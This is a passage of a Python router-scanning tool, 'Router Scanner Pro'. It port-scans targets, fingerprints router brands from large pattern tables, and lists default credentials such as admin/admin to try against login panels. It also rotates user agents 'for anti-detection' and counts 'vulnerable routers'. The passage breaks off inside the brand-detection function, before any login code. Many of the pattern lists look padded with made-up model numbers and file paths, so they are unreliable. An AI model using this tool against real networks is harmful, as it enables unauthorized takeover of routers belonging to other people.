#!/usr/bin/env python3
"""
Router Scanner Pro - Professional Network Security Tool v7.0
Author: Network Security Engineer
Cross-platform: Windows, Linux, macOS
Comprehensive brand detection, session management, and HTML reporting
"""

import os
import sys
import json
import time
import signal
import random
import socket
import argparse
import threading
import re
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import warnings
warnings.filterwarnings('ignore')

# Try to import screenshot libraries
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    SCREENSHOT_AVAILABLE = True
except ImportError:
    SCREENSHOT_AVAILABLE = False

# Cross-platform color support
class Colors:
    if os.name == 'nt':  # Windows
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'
    else:  # Linux/macOS
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'

# Global variables
running = True
stats = {'targets_scanned': 0, 'login_pages_found': 0, 'vulnerable_routers': 0, 'start_time': None}

def signal_handler(sig, frame):
    global running
    print(f"\n{Colors.YELLOW}[!] Stopping scanner safely...{Colors.END}")
    running = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    # Simple matrix-like warmup lines
    for _ in range(3):
        print(f"{Colors.GREEN}" + "|" * 60 + f"{Colors.END}")
        time.sleep(0.05)
    
    banner = f"""
+{Colors.GREEN}{Colors.BOLD}
+   ______       _                 _               _____                                             
+  |  ____|     | |               | |             / ____|                                            
+  | |__   _ __ | | ___   __ _  __| | ___  ___   | (___   ___ __ _ _ __  _ __   ___  _ __   ___ ___  
+  |  __| | '_ \| |/ _ \ / _` |/ _` |/ _ \/ __|   \___ \ / __/ _` | '_ \| '_ \ / _ \| '_ \ / __/ _ \ 
+  | |____| | | | | (_) | (_| | (_| |  __/\__ \   ____) | (_| (_| | | | | | | | (_) | | | | (_|  __/ 
+  |______|_| |_|_|\___/ \__,_|\__,_|\___||___/  |_____/ \___\__,_|_| |_|_| |_|\___/|_| |_|\___\___| 
+
+{Colors.CYAN}:: Router Scanner Pro v7.0 ::{Colors.END}  {Colors.YELLOW}[ Nostalgic Hacker Edition ]{Colors.END}
+{Colors.YELLOW}[!] For Network Security Assessment Only{Colors.END}
+{Colors.WHITE}    "Wake up, Neo..." — follow the white rabbit.{Colors.END}
+"""
    print(banner)

# Target credentials
TARGET_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "support180"),
    ("support", "support"),
    ("user", "user")
]

# Common ports
COMMON_PORTS = [80, 8080, 443, 8443, 8000, 8081, 8888, 8090, 9000, 9090, 1080, 8043]

# User-Agent rotation for anti-detection
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36'
]

# False positive indicators (VPN, Email, Social login pages)
FALSE_POSITIVE_INDICATORS = [
    # VPN indicators
    'vpn', 'openvpn', 'wireguard', 'ipsec', 'l2tp', 'pptp', 'fortinet', 'cisco anyconnect',
    'nordvpn', 'expressvpn', 'surfshark', 'protonvpn', 'tunnelbear', 'cyberghost',
    
    # Email/Social indicators
    'email', 'e-mail', 'gmail', 'yahoo', 'outlook', 'hotmail', 'mail',
    'microsoft', 'google', 'facebook', 'twitter', 'instagram', 'social',
    'cloud', 'office365', 'oauth', 'sso', 'single sign-on', 'account.live.com',
    'accounts.google.com', 'login.live.com', 'facebook.com', 'twitter.com',
    
    # Other non-router indicators
    'github', 'gitlab', 'bitbucket', 'slack', 'discord', 'telegram', 'whatsapp',
    'zoom', 'teams', 'skype', 'dropbox', 'onedrive', 'icloud', 'aws', 'azure'
]

# Comprehensive global brand detection patterns
BRAND_PATTERNS = {
    'tp-link': {
        'content': ['tp-link', 'tplink', 'TP-LINK', 'TPLINK', 'archer', 'TL-', 'deco', 'omada', 'omada controller'],
        'headers': ['tp-link', 'tplink'],
        'paths': ['/userRpm/LoginRpm.htm', '/cgi-bin/luci', '/admin', '/login', '/webpages/login.html'],
        'models': ['TL-', 'Archer', 'Deco', 'Omada']
    },
    'huawei': {
        'content': ['huawei', 'HUAWEI', 'HG', 'B593', 'E5186', 'HG8245', 'HG8240', 'HG8247', 'HG8240H', 'HG8240W5'],
        'headers': ['huawei', 'HUAWEI'],
        'paths': ['/html/index.html', '/asp/login.asp', '/login.cgi', '/admin', '/cgi-bin/webproc'],
        'models': ['HG', 'B593', 'E5186', 'HG8245', 'HG8240', 'HG8247']
    },
    'zte': {
        'content': ['zte', 'ZTE', 'ZXHN', 'MF28G', 'F660', 'F670L', 'F601', 'F609', 'F612', 'F680'],
        'headers': ['zte', 'ZTE'],
        'paths': ['/login.gch', '/start.gch', '/getpage.gch', '/admin', '/cgi-bin/webproc'],
        'models': ['ZXHN', 'MF28G', 'F660', 'F670L', 'F601', 'F609', 'F612']
    },
    'netgear': {
        'content': ['netgear', 'NETGEAR', 'WNDR', 'R7000', 'N600', 'WNR', 'AC', 'AX', 'Orbi', 'Nighthawk'],
        'headers': ['netgear', 'NETGEAR'],
        'paths': ['/setup.cgi', '/genie.cgi', '/cgi-bin/', '/admin', '/login.htm'],
        'models': ['WNDR', 'R7000', 'N600', 'WNR', 'AC', 'AX', 'Orbi', 'Nighthawk']
    },
    'linksys': {
        'content': ['linksys', 'LINKSYS', 'WRT', 'E1200', 'E2500', 'E3200', 'EA', 'Velop', 'MR'],
        'headers': ['linksys', 'LINKSYS'],
        'paths': ['/cgi-bin/webproc', '/cgi-bin/webif', '/admin', '/login', '/setup.cgi'],
        'models': ['WRT', 'E1200', 'E2500', 'E3200', 'EA', 'Velop', 'MR']
    },
    'd-link': {
        'content': ['d-link', 'D-LINK', 'DIR', 'DSL', 'DSL-', 'DAP', 'DGS', 'DCS', 'DWR'],
        'headers': ['d-link', 'D-LINK'],
        'paths': ['/login.php', '/login.asp', '/cgi-bin/login', '/admin', '/login.htm'],
        'models': ['DIR', 'DSL', 'DAP', 'DGS', 'DCS', 'DWR']
    },
    'asus': {
        'content': ['asus', 'ASUS', 'RT-', 'GT-', 'DSL-', 'RT-AC', 'RT-AX', 'ZenWiFi', 'AiMesh', 'Blue Cave'],
        'headers': ['asus', 'ASUS'],
        'paths': ['/Main_Login.asp', '/Advanced_System_Content.asp', '/admin', '/login.asp'],
        'models': ['RT-', 'GT-', 'DSL-', 'RT-AC', 'RT-AX', 'ZenWiFi', 'Blue Cave']
    },
    'fritzbox': {
        'content': ['fritz', 'fritzbox', 'FRITZ', 'AVM', 'Fritz!Box', 'FRITZ!Box', 'Fritz!Repeater'],
        'headers': ['fritz', 'fritzbox', 'FRITZ', 'AVM'],
        'paths': ['/cgi-bin/webcm', '/cgi-bin/firmwarecfg', '/admin', '/login.lua'],
        'models': ['FRITZ!Box', 'FRITZ!Repeater', 'FRITZ!Powerline']
    },
    'draytek': {
        'content': [
            # Basic DrayTek terms
            'draytek', 'DRAYTEK', 'DrayTek', 'DRAYTEK', 'draytek vigor', 'DrayTek Vigor',
            # Vigor series
            'vigor', 'Vigor', 'VIGOR', 'VigorRouter', 'VigorSwitch', 'VigorOS', 'vigorrouter', 
            'vigor switch', 'vigor router', 'vigor os', 'vigor management', 'vigor admin',
            # Model numbers
            'vigor 2130', 'vigor 2130n', 'vigor 2130v', 'vigor 2130vn', 'vigor 2130v2', 'vigor 2130v2n', 
            'vigor 2130v2vn', 'vigor 2130v3', 'vigor 2130v3n', 'vigor 2130v3vn', 'vigor 2130v4', 'vigor 2130v4n', 
            'vigor 2130v4vn', 'vigor 2130v5', 'vigor 2130v5n', 'vigor 2130v5vn', 'vigor 2130v6', 'vigor 2130v6n', 
            'vigor 2130v6vn', 'vigor 2130v7', 'vigor 2130v7n', 'vigor 2130v7vn', 'vigor 2130v8', 'vigor 2130v8n', 
            'vigor 2130v8vn', 'vigor 2130v9', 'vigor 2130v9n', 'vigor 2130v9vn', 'vigor 2130v10', 'vigor 2130v10n', 
            'vigor 2130v10vn', 'vigor 2860', 'vigor 2920', 'vigor 2950', 'vigor 3900', 'vigor 2960', 'vigor 3000',
            # Title patterns
            'draytek vigor router', 'vigor router management', 'vigor admin panel', 'vigor web interface',
            'draytek management', 'vigor login', 'draytek login', 'vigor authentication', 'draytek authentication',
            # Logo and image patterns
            'draytek logo', 'vigor logo', 'draytek.gif', 'vigor.gif', 'draytek.png', 'vigor.png',
            'draytek.jpg', 'vigor.jpg', 'draytek.svg', 'vigor.svg', 'draytek.ico', 'vigor.ico',
            # CSS and style patterns
            'draytek.css', 'vigor.css', 'draytek style', 'vigor style', 'draytek theme', 'vigor theme',
            # JavaScript patterns
            'draytek.js', 'vigor.js', 'draytek javascript', 'vigor javascript', 'draytek function', 'vigor function',
            # Form patterns
            'draytek form', 'vigor form', 'draytek login form', 'vigor login form', 'draytek authentication form',
            'vigor authentication form', 'draytek submit', 'vigor submit', 'draytek button', 'vigor button',
            # Meta tags and descriptions
            'draytek meta', 'vigor meta', 'draytek description', 'vigor description', 'draytek keywords', 'vigor keywords',
            # Copyright and footer
            'draytek copyright', 'vigor copyright', 'draytek footer', 'vigor footer', 'draytek inc', 'vigor inc',
            'copyright © 2000-2025 draytek corp', 'copyright © 2000-2024 draytek corp', 'copyright © 2000-2023 draytek corp',
            'copyright © 2000-2022 draytek corp', 'copyright © 2000-2021 draytek corp', 'copyright © 2000-2020 draytek corp',
            'copyright © 2000-2019 draytek corp', 'copyright © 2000-2018 draytek corp', 'copyright © 2000-2017 draytek corp',
            'copyright © 2000-2016 draytek corp', 'copyright © 2000-2015 draytek corp', 'copyright © 2000-2014 draytek corp',
            'copyright © 2000-2013 draytek corp', 'copyright © 2000-2012 draytek corp', 'copyright © 2000-2011 draytek corp',
            'copyright © 2000-2010 draytek corp', 'copyright © 2000-2009 draytek corp', 'copyright © 2000-2008 draytek corp',
            'copyright © 2000-2007 draytek corp', 'copyright © 2000-2006 draytek corp', 'copyright © 2000-2005 draytek corp',
            'copyright © 2000-2004 draytek corp', 'copyright © 2000-2003 draytek corp', 'copyright © 2000-2002 draytek corp',
            'copyright © 2000-2001 draytek corp', 'copyright © 2000 draytek corp', 'all rights reserved draytek',
            # Network and system info
            'draytek system', 'vigor system', 'draytek network', 'vigor network', 'draytek configuration', 'vigor configuration',
            'draytek settings', 'vigor settings', 'draytek status', 'vigor status', 'draytek info', 'vigor info'
        ],
        'headers': [
            'draytek', 'DRAYTEK', 'DrayTek', 'vigor', 'Vigor', 'VIGOR', 'vigorrouter', 'vigor switch', 
            'vigor router', 'draytek vigor', 'vigor management', 'draytek management', 'vigor admin', 'draytek admin'
        ],
        'paths': [
            # Standard paths
            '/', '/weblogin.htm', '/cgi-bin/login', '/login.asp', '/admin', '/login.htm', '/cgi-bin/webproc', 
            '/cgi-bin/login.cgi', '/login.cgi', '/login.html', '/web/login', '/cgi-bin/weblogin',
            # Extended paths
            '/cgi-bin/webif', '/cgi-bin/webif.cgi', '/cgi-bin/webproc.cgi', '/cgi-bin/webif.asp', '/cgi-bin/webproc.asp', 
            '/cgi-bin/webif.php', '/cgi-bin/webproc.php', '/cgi-bin/webif.pl', '/cgi-bin/webproc.pl', 
            '/cgi-bin/webif.py', '/cgi-bin/webproc.py', '/cgi-bin/webif.rb', '/cgi-bin/webproc.rb', 
            '/cgi-bin/webif.jsp', '/cgi-bin/webproc.jsp', '/cgi-bin/webif.aspx', '/cgi-bin/webproc.aspx', 
            '/cgi-bin/webif.cfm', '/cgi-bin/webproc.cfm', '/cgi-bin/webif.dhtml', '/cgi-bin/webproc.dhtml', 
            '/cgi-bin/webif.shtml', '/cgi-bin/webproc.shtml', '/cgi-bin/webif.xhtml', '/cgi-bin/webproc.xhtml', 
            '/cgi-bin/webif.xml', '/cgi-bin/webproc.xml', '/cgi-bin/webif.json', '/cgi-bin/webproc.json', 
            '/cgi-bin/webif.yaml', '/cgi-bin/webproc.yaml', '/cgi-bin/webif.yml', '/cgi-bin/webproc.yml', 
            '/cgi-bin/webif.txt', '/cgi-bin/webproc.txt', '/cgi-bin/webif.html', '/cgi-bin/webproc.html', 
            '/cgi-bin/webif.htm', '/cgi-bin/webproc.htm',
            # DrayTek specific paths
            '/cgi-bin/draytek', '/cgi-bin/vigor', '/draytek/', '/vigor/', '/draytek/login', '/vigor/login',
            '/draytek/admin', '/vigor/admin', '/draytek/management', '/vigor/management', '/draytek/status', '/vigor/status',
            '/draytek/config', '/vigor/config', '/draytek/settings', '/vigor/settings', '/draytek/info', '/vigor/info',
            '/draytek/system', '/vigor/system', '/draytek/network', '/vigor/network', '/draytek/interface', '/vigor/interface',
            '/draytek/control', '/vigor/control', '/draytek/panel', '/vigor/panel', '/draytek/dashboard', '/vigor/dashboard'
        ],
        'models': [
            'Vigor', 'VigorRouter', 'VigorSwitch', 'VigorOS', 'Vigor 2130', 'Vigor 2130N', 'Vigor 2130V', 
            'Vigor 2130VN', 'Vigor 2130V2', 'Vigor 2130V2N', 'Vigor 2130V2VN', 'Vigor 2130V3', 'Vigor 2130V3N', 
            'Vigor 2130V3VN', 'Vigor 2130V4', 'Vigor 2130V4N', 'Vigor 2130V4VN', 'Vigor 2130V5', 'Vigor 2130V5N', 
            'Vigor 2130V5VN', 'Vigor 2130V6', 'Vigor 2130V6N', 'Vigor 2130V6VN', 'Vigor 2130V7', 'Vigor 2130V7N', 
            'Vigor 2130V7VN', 'Vigor 2130V8', 'Vigor 2130V8N', 'Vigor 2130V8VN', 'Vigor 2130V9', 'Vigor 2130V9N', 
            'Vigor 2130V9VN', 'Vigor 2130V10', 'Vigor 2130V10N', 'Vigor 2130V10VN', 'Vigor 2860', 'Vigor 2920', 
            'Vigor 2950', 'Vigor 3900', 'Vigor 2960', 'Vigor 3000', 'DrayTek Vigor', 'DrayTek Router', 'DrayTek Switch'
        ]
    },
    'mikrotik': {
        'content': ['mikrotik', 'MIKROTIK', 'RouterOS', 'routerboard', 'RB', 'CCR', 'CRS'],
        'headers': ['mikrotik', 'MIKROTIK'],
        'paths': ['/webfig', '/winbox', '/admin', '/login'],
        'models': ['RB', 'CCR', 'CRS', 'RouterBoard']
    },
    'ubiquiti': {
        'content': ['ubiquiti', 'UBIQUITI', 'UniFi', 'EdgeRouter', 'EdgeSwitch', 'AirOS'],
        'headers': ['ubiquiti', 'UBIQUITI'],
        'paths': ['/login', '/admin', '/cgi-bin/luci', '/cgi-bin/webif'],
        'models': ['UniFi', 'EdgeRouter', 'EdgeSwitch', 'AirOS']
    },
    'cisco': {
        'content': ['cisco', 'CISCO', 'Linksys', 'Meraki', 'Catalyst', 'ISR', 'ASR'],
        'headers': ['cisco', 'CISCO'],
        'paths': ['/admin', '/login', '/cgi-bin/login', '/cgi-bin/webif'],
        'models': ['Catalyst', 'ISR', 'ASR', 'Meraki']
    },
    'belkin': {
        'content': ['belkin', 'BELKIN', 'F9K', 'N300', 'N600', 'AC1200', 'AC1750'],
        'headers': ['belkin', 'BELKIN'],
        'paths': ['/login.asp', '/admin', '/login', '/cgi-bin/login'],
        'models': ['F9K', 'N300', 'N600', 'AC1200', 'AC1750']
    },
    'buffalo': {
        'content': ['buffalo', 'BUFFALO', 'WZR', 'WHR', 'WCR', 'AirStation'],
        'headers': ['buffalo', 'BUFFALO'],
        'paths': ['/cgi-bin/login', '/admin', '/login', '/cgi-bin/webif'],
        'models': ['WZR', 'WHR', 'WCR', 'AirStation']
    },
    'tenda': {
        'content': ['tenda', 'TENDA', 'AC', 'N', 'F', 'W', 'AC6', 'AC9', 'AC15'],
        'headers': ['tenda', 'TENDA'],
        'paths': ['/login.asp', '/admin', '/login', '/cgi-bin/login'],
        'models': ['AC6', 'AC9', 'AC15', 'N300', 'F3']
    },
    'xiaomi': {
        'content': ['xiaomi', 'XIAOMI', 'mi router', 'MI ROUTER', 'Redmi', 'REDMI'],
        'headers': ['xiaomi', 'XIAOMI'],
        'paths': ['/cgi-bin/luci', '/admin', '/login', '/cgi-bin/webif'],
        'models': ['Mi Router', 'Redmi Router', 'AX3600', 'AX6000']
    },
    'technicolor': {
        'content': ['technicolor', 'TECHNICOLOR', 'TG', 'TC', 'TG789', 'TG799'],
        'headers': ['technicolor', 'TECHNICOLOR'],
        'paths': ['/cgi-bin/login', '/admin', '/login', '/cgi-bin/webif'],
        'models': ['TG789', 'TG799', 'TC7200', 'TC7300']
    },
    'sagemcom': {
        'content': ['sagemcom', 'SAGEMCOM', 'Fast', 'FAST', 'F@ST', 'F@ST 5366'],
        'headers': ['sagemcom', 'SAGEMCOM'],
        'paths': ['/cgi-bin/login', '/admin', '/login', '/cgi-bin/webif'],
        'models': ['F@ST', 'F@ST 5366', 'F@ST 5365']
    },
    'yealink': {
        'content': ['yealink', 'YEALINK', 'DECT', 'W70B', 'W80B', 'W90B', 'T4', 'T5', 'CP'],
        'headers': ['yealink', 'YEALINK'],
        'paths': ['/cgi-bin/login', '/admin', '/login', '/cgi-bin/webif', '/login.htm', '/admin.htm'],
        'models': ['W70B', 'W80B', 'W90B', 'T4', 'T5', 'CP']
    },
    'netcomm': {
        'content': [
            # Basic NetComm terms
            'netcomm', 'NETCOMM', 'NetComm', 'NETCOMM', 'netcomm wireless', 'NetComm Wireless', 'NETCOMM WIRELESS',
            'netcomm router', 'NetComm Router', 'NETCOMM ROUTER', 'netcomm modem', 'NetComm Modem', 'NETCOMM MODEM',
            'netcomm gateway', 'NetComm Gateway', 'NETCOMM GATEWAY', 'netcomm access point', 'NetComm Access Point', 'NETCOMM ACCESS POINT',
            # Model numbers and series
            'netcomm nf', 'NetComm NF', 'NETCOMM NF', 'netcomm nf3', 'NetComm NF3', 'NETCOMM NF3', 'netcomm nf4', 'NetComm NF4', 'NETCOMM NF4',
            'netcomm nf5', 'NetComm NF5', 'NETCOMM NF5', 'netcomm nf6', 'NetComm NF6', 'NETCOMM NF6', 'netcomm nf7', 'NetComm NF7', 'NETCOMM NF7',
            'netcomm nf8', 'NetComm NF8', 'NETCOMM NF8', 'netcomm nf9', 'NetComm NF9', 'NETCOMM NF9', 'netcomm nf10', 'NetComm NF10', 'NETCOMM NF10',
            'netcomm nf11', 'NetComm NF11', 'NETCOMM NF11', 'netcomm nf12', 'NetComm NF12', 'NETCOMM NF12', 'netcomm nf13', 'NetComm NF13', 'NETCOMM NF13',
            'netcomm nf14', 'NetComm NF14', 'NETCOMM NF14', 'netcomm nf15', 'NetComm NF15', 'NETCOMM NF15', 'netcomm nf16', 'NetComm NF16', 'NETCOMM NF16',
            'netcomm nf17', 'NetComm NF17', 'NETCOMM NF17', 'netcomm nf18', 'NetComm NF18', 'NETCOMM NF18', 'netcomm nf19', 'NetComm NF19', 'NETCOMM NF19',
            'netcomm nf20', 'NetComm NF20', 'NETCOMM NF20', 'netcomm nf21', 'NetComm NF21', 'NETCOMM NF21', 'netcomm nf22', 'NetComm NF22', 'NETCOMM NF22',
            'netcomm nf23', 'NetComm NF23', 'NETCOMM NF23', 'netcomm nf24', 'NetComm NF24', 'NETCOMM NF24', 'netcomm nf25', 'NetComm NF25', 'NETCOMM NF25',
            'netcomm nf26', 'NetComm NF26', 'NETCOMM NF26', 'netcomm nf27', 'NetComm NF27', 'NETCOMM NF27', 'netcomm nf28', 'NetComm NF28', 'NETCOMM NF28',
            'netcomm nf29', 'NetComm NF29', 'NETCOMM NF29', 'netcomm nf30', 'NetComm NF30', 'NETCOMM NF30', 'netcomm nf31', 'NetComm NF31', 'NETCOMM NF31',
            'netcomm nf32', 'NetComm NF32', 'NETCOMM NF32', 'netcomm nf33', 'NetComm NF33', 'NETCOMM NF33', 'netcomm nf34', 'NetComm NF34', 'NETCOMM NF34',
            'netcomm nf35', 'NetComm NF35', 'NETCOMM NF35', 'netcomm nf36', 'NetComm NF36', 'NETCOMM NF36', 'netcomm nf37', 'NetComm NF37', 'NETCOMM NF37',
            'netcomm nf38', 'NetComm NF38', 'NETCOMM NF38', 'netcomm nf39', 'NetComm NF39', 'NETCOMM NF39', 'netcomm nf40', 'NetComm NF40', 'NETCOMM NF40',
            # Title patterns
            'netcomm router management', 'netcomm admin panel', 'netcomm web interface', 'netcomm management', 'netcomm login', 'netcomm authentication',
            'netcomm router login', 'netcomm admin login', 'netcomm management login', 'netcomm router admin', 'netcomm router management',
            # Logo and image patterns
            'netcomm logo', 'netcomm.gif', 'netcomm.png', 'netcomm.jpg', 'netcomm.svg', 'netcomm.ico',
            # CSS and style patterns
            'netcomm.css', 'netcomm style', 'netcomm theme',
            # JavaScript patterns
            'netcomm.js', 'netcomm javascript', 'netcomm function',
            # Form patterns
            'netcomm form', 'netcomm login form', 'netcomm authentication form', 'netcomm submit', 'netcomm button',
            # Meta tags and descriptions
            'netcomm meta', 'netcomm description', 'netcomm keywords',
            # Copyright and footer
            'netcomm copyright', 'netcomm footer', 'netcomm inc',
            # Network and system info
            'netcomm system', 'netcomm network', 'netcomm configuration', 'netcomm settings', 'netcomm status', 'netcomm info'
        ],
        'headers': [
            'netcomm', 'NETCOMM', 'NetComm', 'netcomm wireless', 'netcomm router', 'netcomm modem', 'netcomm gateway',
            'netcomm management', 'netcomm admin', 'netcomm access point'
        ],
        'paths': [
            # Standard paths
            '/', '/admin', '/login', '/cgi-bin/login', '/cgi-bin/admin', '/cgi-bin/status', '/cgi-bin/info', '/cgi-bin/config', 
            '/cgi-bin/settings', '/cgi-bin/system', '/cgi-bin/network', '/cgi-bin/interface', '/cgi-bin/control', '/cgi-bin/panel', 
            '/cgi-bin/dashboard', '/cgi-bin/management',
            # Extended paths
            '/cgi-bin/status.cgi', '/cgi-bin/info.cgi', '/cgi-bin/config.cgi', '/cgi-bin/settings.cgi', '/cgi-bin/system.cgi', 
            '/cgi-bin/network.cgi', '/cgi-bin/interface.cgi', '/cgi-bin/control.cgi', '/cgi-bin/panel.cgi', '/cgi-bin/dashboard.cgi', 
            '/cgi-bin/management.cgi', '/cgi-bin/status.asp', '/cgi-bin/info.asp', '/cgi-bin/config.asp', '/cgi-bin/settings.asp', 
            '/cgi-bin/system.asp', '/cgi-bin/network.asp', '/cgi-bin/interface.asp', '/cgi-bin/control.asp', '/cgi-bin/panel.asp', 
            '/cgi-bin/dashboard.asp', '/cgi-bin/management.asp', '/cgi-bin/status.php', '/cgi-bin/info.php', '/cgi-bin/config.php', 
            '/cgi-bin/settings.php', '/cgi-bin/system.php', '/cgi-bin/network.php', '/cgi-bin/interface.php', '/cgi-bin/control.php', 
            '/cgi-bin/panel.php', '/cgi-bin/dashboard.php', '/cgi-bin/management.php',
            # NetComm specific paths
            '/cgi-bin/netcomm', '/netcomm/', '/netcomm/login', '/netcomm/admin', '/netcomm/management', '/netcomm/status', 
            '/netcomm/config', '/netcomm/settings', '/netcomm/info', '/netcomm/system', '/netcomm/network', '/netcomm/interface', 
            '/netcomm/control', '/netcomm/panel', '/netcomm/dashboard'
        ],
        'models': [
            'NF3', 'NF4', 'NF5', 'NF6', 'NF7', 'NF8', 'NF9', 'NF10', 'NF11', 'NF12', 'NF13', 'NF14', 'NF15', 'NF16', 'NF17', 
            'NF18', 'NF19', 'NF20', 'NF21', 'NF22', 'NF23', 'NF24', 'NF25', 'NF26', 'NF27', 'NF28', 'NF29', 'NF30', 'NF31', 
            'NF32', 'NF33', 'NF34', 'NF35', 'NF36', 'NF37', 'NF38', 'NF39', 'NF40', 'NetComm Router', 'NetComm Modem', 'NetComm Gateway', 
            'NetComm Access Point', 'NetComm Wireless', 'NetComm NF Series'
        ]
    },
    'generic': {
        'content': [],
        'headers': [],
        'paths': ['/', '/admin', '/login', '/login.htm', '/admin.htm', '/index.html', '/cgi-bin/login', '/cgi-bin/webif', '/cgi-bin/webproc', '/login.asp', '/login.php', '/login.cgi', '/weblogin.htm', '/web/login', '/manager', '/control', '/config', '/settings', '/system', '/dashboard', '/panel', '/console', '/interface'],
        'models': []
    }
}

# Admin panel indicators
ADMIN_INDICATORS = [
    'dashboard', 'status', 'configuration', 'admin panel', 'control panel', 'welcome',
    'logout', 'log out', 'system information', 'device status', 'main menu',
    'router', 'gateway', 'modem', 'access point', 'network', 'wireless',
    'lan', 'wan', 'dhcp', 'nat', 'firewall', 'port forwarding', 'qos',
    'firmware', 'upgrade', 'backup', 'restore', 'reboot', 'restart'
]

class RouterScannerPro:
    def __init__(self, targets, threads=1, timeout=6, enable_screenshot=True):
        self.targets = list(set(targets))  # Remove duplicates
        self.threads = threads
        self.timeout = timeout
        self.enable_screenshot = enable_screenshot
        self.session = self.create_session()
        self.lock = threading.Lock()
        
    def create_session(self):
        session = requests.Session()
        retry_strategy = Retry(total=2, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=self.threads, pool_maxsize=self.threads)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Random User-Agent
        session.headers.update({
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        return session
    
    def scan_ports_fast(self, ip):
        open_ports = []
        for port in COMMON_PORTS:
            if not running:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.8)  # Balanced timeout for reliability
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        return open_ports
    
    def detect_router_brand_advanced(self, ip, port):
        """Advanced brand detection using multiple methods"""
        try:
            url = f"http://{ip}:{port}/"
            
            # Try multiple User-Agents for better detection
            for user_agent in random.sample(USER_AGENTS, 3):
                try:
                    headers = {'User-Agent': user_agent}
                    response = self.session.get(url, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
                    
                    if response.status_code == 200:
                        content = response.text.lower()
                        headers_str = str(response.headers).lower()
                        
                        # Check each brand
                        for brand, patterns in BRAND_PATTERNS.items():
                            if brand == 'generic':
                                continue
                                
                            score = 0
                            
                            # Check content patterns
                            content_matches = sum(1 for pattern in patterns['content'] if pattern.lower() in content)
                            score += content_matches * 2
                            
                            # Check header patterns
                            header_matches = sum(1 for pattern in patterns['headers'] if pattern.lower() in headers_str)
                            score += header_matches * 3
                            
                            # Check server header
                            server_header = response.headers.get('Server', '').lower()
                            server_matches = sum(1 for pattern in patterns['headers'] if pattern.lower() in server_header)
                            score += server_matches * 3
                            
                            # Title detection (extract from <title> tag)
                            title_match = re.search(r'<title[^>]*>(.*?)</title>', response.text, re.IGNORECASE | re.DOTALL)
                            if title_match:
                                title = title_match.group(1).lower()
                                title_matches = sum(1 for pattern in patterns['content'] if pattern.lower() in title)
                                score += title_matches * 4  # Higher weight for title matches
                            
                            # Logo and image detection
                            for pattern in patterns['content']:
                                logo_patterns = [
                                    r'<img[^>]*src[^>]*' + re.escape(pattern.lower()) + r'[^>]*>',
                                    r'<img[^>]*alt[^>]*' + re.escape(pattern.lower()) + r'[^>]*>',
                                    r'background[^>]*url[^>]*' + re.escape(pattern.lower()) + r'[^>]*',
                                    r'logo[^>]*' + re.escape(pattern.lower()) + r'[^>]*',
                                    pattern.lower() + r'\.(gif|png|jpg|jpeg|svg|ico)'
                                ]
                                
                                for logo_pattern in logo_patterns:
                                    if re.search(logo_pattern, content):
                                        score += 3  # High weight for logo matches
                                        break
                            
                            # Meta tag detection
                            for pattern in patterns['content']:
                                meta_patterns = [
                                    r'<meta[^>]*name[^>]*content[^>]*' + re.escape(pattern.lower()) + r'[^>]*>',
                                    r'<meta[^>]*content[^>]*' + re.escape(pattern.lower()) + r'[^>]*>',
                                    r'<meta[^>]*description[^>]*' + re.escape(pattern.lower()) + r'[^>]*>',
                                    r'<meta[^>]*keywords[^>]*' + re.escape(pattern.lower()) + r'[^>]*>'
                                ]
                                
                                for meta_pattern in meta_patterns:
                                    if re.search(meta_pattern, content):
                                        score += 2
                                        break
                            
                            # Copyright and footer detection
                            for pattern in patterns['content']:
                                copyright_patterns = [
                                    r'copyright[^>]*' + re.escape(pattern.lower()) + r'[^>]*',
                                    r'footer[^>]*' + re.escape(pattern.lower()) + r'[^>]*',
                                    r'&copy;[^>]*' + re.escape(pattern.lower()) + r'[^>]*',
